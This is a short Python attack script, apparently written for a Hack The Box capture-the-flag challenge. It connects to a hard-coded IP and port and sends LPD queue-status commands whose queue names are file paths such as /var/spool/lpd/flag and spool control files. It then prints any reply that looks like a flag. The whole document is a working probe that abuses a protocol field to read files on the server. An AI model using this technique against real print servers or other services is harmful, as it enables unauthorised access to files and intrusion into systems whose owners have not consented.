#!/usr/bin/env python3
import socket
import time

TARGET = "94.237.49.23"
PORT = 37326

def try_queue_name(queue_name):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET, PORT))
        
        data = b'\x04' + queue_name.encode() + b'\n'
        s.sendall(data)
        time.sleep(0.5)
        
        resp = b''
        s.settimeout(3)
        try:
            while True:
                chunk = s.recv(8192)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        
        s.close()
        return resp
    except Exception as e:
        return f"Error: {e}".encode()

# Intentar archivos comunes en spool y variaciones de flag
queues = [
    "/var/spool/lpd/flag",
    "/var/spool/lpd/flag.txt",
    "/var/spool/lpd/.flag",
    "/var/spool/flag",
    "/var/spool/flag.txt",
    "/var/flag.txt",
    "/var/flag",
    "flag",
    "lp/flag",
    "lp/flag.txt",
    "/var/spool/lpd/lp/flag",
    "/var/spool/lpd/lp/flag.txt",
    "/var/spool/lpd/lp/.lock",
    "/var/spool/lpd/lp/.status",
    # Intentar con extensiones comunes de LPD
    "/var/spool/lpd/lp/cfA001localhost",
    "/var/spool/lpd/lp/dfA001localhost",
]

for q in queues:
    print(f"=== Queue: {q!r} ===")
    resp = try_queue_name(q)
    print(f"Length: {len(resp)}")
    if len(resp) > 1:
        print(f"Hex: {resp[:100].hex()}")
        try:
            decoded = resp.decode('utf-8', errors='replace')
            print(f"Text: {decoded[:500]}")
            if 'HTB' in decoded or 'FLAG' in decoded or 'flag{' in decoded:
                print("!!! POSSIBLE FLAG FOUND !!!")
        except:
            print(f"Raw: {resp[:100]}")
    elif len(resp) == 1:
        print(f"Single byte: 0x{resp[0]:02x}")
    print()